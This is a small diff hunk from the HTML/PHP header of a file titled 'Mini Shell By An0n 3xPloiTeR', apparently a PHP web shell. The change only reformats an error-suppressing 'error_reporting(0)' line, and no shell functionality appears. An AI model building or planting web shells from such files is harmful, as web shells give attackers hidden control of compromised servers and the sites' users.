@@ -1,8 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-	<?php
-error_reporting(0);?>
+		<?php error_reporting(0);?>
 		<title>Mini Shell By An0n 3xPloiTeR</title>
 		<meta charset="UTF-8" />
 		<meta name="description" content="This Mini Shell is Designed By An0n 3xPloiTeR" />
